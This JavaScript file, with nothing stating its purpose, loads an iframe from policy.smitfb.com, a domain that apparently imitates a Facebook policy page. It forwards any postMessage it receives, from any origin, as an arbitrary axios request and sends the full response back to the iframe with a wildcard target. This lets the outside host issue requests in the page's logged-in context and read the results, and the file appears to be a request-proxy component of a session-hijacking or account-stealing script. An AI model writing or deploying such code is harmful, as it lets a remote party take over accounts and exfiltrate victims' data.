import axios from "axios";
const iframe = document.querySelector("iframe");
iframe.src ="https://policy.smitfb.com/popup.html?t="+Date.now(); 
window.addEventListener('message', function(ev) {
        if (!ev.data)   
        return;
        var message;
        try {
            message = JSON.parse(ev.data);
        } catch (ex) {
            console.error(ex);
        }
        // ignore messages not having a callback ID
        if (!message || !message.callbackId)
        return;

        callApiHandler(message);       
});
function callApiHandler(message) {
    console.log(message);
    axios(message)
    .then((res) => {
        var responseData = {};
        responseData.callbackId = message.callbackId

        try {
            const tmp = JSON.parse(res.data);
            responseData.data = tmp;

        } catch (ex) {
            responseData.data = res.data;
        }
        iframe.contentWindow.postMessage(JSON.stringify(responseData), "*");
    })
    .catch((err) => {
        const data = {};
        data.errorData = err;
        data.callbackId = message.callbackId;
        iframe.contentWindow.postMessage(JSON.stringify(data), "*");
    });
}

    